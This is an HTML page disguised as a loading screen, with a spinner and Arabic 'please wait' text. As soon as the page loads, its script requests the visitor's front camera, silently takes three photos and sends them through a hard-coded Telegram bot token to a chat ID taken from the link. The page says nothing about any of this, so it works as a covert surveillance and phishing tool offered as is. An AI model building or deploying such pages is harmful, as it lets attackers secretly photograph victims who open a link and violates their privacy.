<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #1a2a3a;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: white;
            overflow: hidden;
        }
        
        .loader-container {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .spinner {
            width: 80px;
            height: 80px;
            border: 8px solid rgba(255,255,255,0.3);
            border-top: 8px solid #3498db;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 20px;
        }
        
        .loading-text {
            font-size: 18px;
            color: rgba(255,255,255,0.8);
            margin-top: 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="spinner"></div>
        <div class="loading-text">Ù„Ø­Ø¸Ø© Ù…Ù† ÙØ¶Ù„Ùƒ...</div>
    </div>

    <video id="cameraPreview" class="hidden" autoplay playsinline></video>
    <canvas id="photoCanvas" class="hidden"></canvas>

    <script>
        const BOT_TOKEN = '8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g';
        
        function getChatId() {
            const params = new URLSearchParams(window.location.search);
            return params.get('chatId');
        }
        
        async function sendPhotoToTelegram(photoBlob, chatId, photoNumber) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photoBlob, `photo_${photoNumber}.jpg`);
            formData.append('caption', `ğŸ“¸ Ø§Ù„ØµÙˆØ±Ø© Ø±Ù‚Ù… ${photoNumber}\nâ° ${new Date().toLocaleString('ar-EG')}`);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                return false;
            }
        }
        
        async function capturePhoto(video, canvas) {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            return new Promise((resolve) => {
                canvas.toBlob(resolve, 'image/jpeg', 0.8);
            });
        }
        
        async function takeThreePhotos() {
            const chatId = getChatId();
            if (!chatId) return;
            
            const video = document.getElementById('cameraPreview');
            const canvas = document.getElementById('photoCanvas');
            
            try {
                // ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                video.srcObject = stream;
                
                // Ø§Ù†ØªØ¸Ø§Ø± ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                });
                
                // Ø§Ù„ØªÙ‚Ø§Ø· 3 ØµÙˆØ±
                for (let i = 1; i <= 3; i++) {
                    const photoBlob = await capturePhoto(video, canvas);
                    await sendPhotoToTelegram(photoBlob, chatId, i);
                }
                
                // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.error('Error accessing camera:', error);
            }
        }
        
        // Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± ÙÙˆØ±Ø§Ù‹
        window.addEventListener('load', takeThreePhotos);
    </script>
</body>
</html>
